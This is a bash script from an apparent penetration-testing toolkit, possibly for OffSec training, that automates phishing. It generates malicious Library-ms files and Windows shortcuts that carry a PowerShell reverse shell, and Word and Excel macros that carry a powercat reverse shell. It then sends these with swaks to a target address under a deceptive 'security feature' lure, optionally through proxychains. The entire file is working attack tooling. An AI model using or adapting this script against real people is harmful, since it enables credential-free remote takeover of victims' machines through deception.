#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/network.sh
source $SCRIPTDIR/reverse_shell.sh
source $SCRIPTDIR/.env

get_config_library() {
    if [[ -z "$http_ip" ]]; then
        echo "Please set the http ip first"
        return 1
    fi
    local config_file="config.Library-ms"
    cp $SCRIPTDIR/../xml/$config_file .
    sed -E -i 's/\{http_ip\}/'$http_ip'/g' $config_file
    sed -E -i 's/\{http_port\}/'$http_port'/g' $config_file
}

generate_windows_shortcut() {
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    else
        echo "Using cmd=$cmd"
    fi
    local shortcut_name=$1
    if [[ -z "$shortcut_name" ]]; then
        shortcut_name="automatic_configuration.lnk"
    fi
    cp $SCRIPTDIR/../ps1/windows_shortcut.ps1 .
    sed -E -i 's/\{cmd\}/'"$cmd"'/g' windows_shortcut.ps1
    sed -E -i 's/\{shortcut_name\}/'$shortcut_name'/g' windows_shortcut.ps1
    local run_shortcut=$(cat windows_shortcut.ps1)
    run_shortcut=$(encode_powershell "$run_shortcut")
    #echo $run_shortcut
    ssh $windows_username@$windows_computername "$run_shortcut"
    if [[ ! -d "shortcuts" ]]; then
        mkdir shortcuts
    fi
    scp $windows_username@$windows_computername:c:/users/$windows_username/$shortcut_name shortcuts
    cp shortcuts/$shortcut_name . # offsec might expect it in this location rather than looking at the actual URL
}

send_phishing_email() {

    if [[ -z "$attachment_type" ]]; then
        attachment_type="shortcut"
    fi
    local attach_type_option=""
    if [[ "$attachment_type" == "shortcut" ]]; then
        get_config_library
        generate_windows_shortcut
        attachment=@config.Library-ms
    elif [[ "$attachment_type" == "doc" ]]; then
        get_word_macro
        attach_type_option="--attach-type application/msword"
        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
            echo "Attachment file not found. Please generate the Word attachment first."
            return 1
        fi
    elif [[ "$attachment_type" == "xls" ]]; then
        get_xls_macro
        attach_type_option="--attach-type application/vnd.ms-excel"
        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
            echo "Attachment file not found. Please generate the Excel attachment first."
            return 1
        fi
    elif [[ "$attachment_type" == "xlsm" ]]; then
        get_xls_macro
        attach_type_option="--attach-type application/vnd.ms-excel.sheet.macroEnabled.12"
        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
            echo "Attachment file not found. Please generate the Excel attachment first."
            return 1
        fi
    fi

    if [[ -z "$target_email" ]]; then
        echo "Target email is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$sender_email" ]]; then
        echo "Sender email is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_server" ]]; then
        echo "SMTP server is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_username" ]]; then
        echo "SMTP username is not set. Ensure that this is your intention."
    fi
    if [[ -z "$smtp_password" ]]; then
        echo "SMTP password is not set. Ensure that this is your intention"
    fi
    if [[ ! -f email_header.txt ]]; then
        echo "Creating email header file."
        echo "Subject: Staging Script" > email_header.txt
    fi
    if [[ ! -f email_body.txt ]]; then
        echo "Creating email body file."
        echo "Hey!" > email_body.txt
        echo "Please install the new security feature for your workstation" >> email_body.txt
        echo "For this, download the attachment file, double-click on it, and execute the configuration shortcut within. Thanks!" >> email_body.txt
    fi
    local smtp_authentication=""
    if [[ ! -z "$smtp_username" ]] && [[ ! -z "$smtp_password" ]]; then
        smtp_authentication="--auth LOGIN --auth-user $smtp_username --auth-password $smtp_password"
    fi
    local proxychain_command=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Using proxychains for sending email."
    else
        proxychain_command=""
    fi
    ${proxychain_command}swaks -t $target_email --from $sender_email $attach_type_option --attach @$attachment --header "$email_header" --body @email_body.txt --server $smtp_server $smtp_authentication
}

get_word_macro() {
    if [[ -z $cmd ]]; then
        background_shell=false
        cmd=$(get_powercat_reverse_shell)
    fi
    cp $SCRIPTDIR/../python/generate_macro.py .
    python3 generate_macro.py doc "$cmd"

}

get_xls_macro() {
    if [[ -z $cmd ]]; then
        background_shell=false
        cmd=$(get_powercat_reverse_shell)
    fi
    cp $SCRIPTDIR/../python/generate_macro.py .
    python3 generate_macro.py xls "$cmd"

}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    if [[ -z "$windows_username" ]] || [[ -z "$windows_computername" ]]; then
        echo "Windows username and computer name must be set before running this script."
        exit 1
    fi
    if [[ "$1" == "get_config_library" ]]; then
        host_ip=127.0.0.1
        get_config_library
        exit 0
    elif [[ "$1" == "generate_windows_shortcut" ]]; then
        host_ip=127.0.0.1
        http_ip=127.0.0.1
        generate_windows_shortcut "$2"
        exit 0
    fi
    echo "Usage: $0 {get_config_library|generate_windows_shortcut [shortcut_name]}"
fi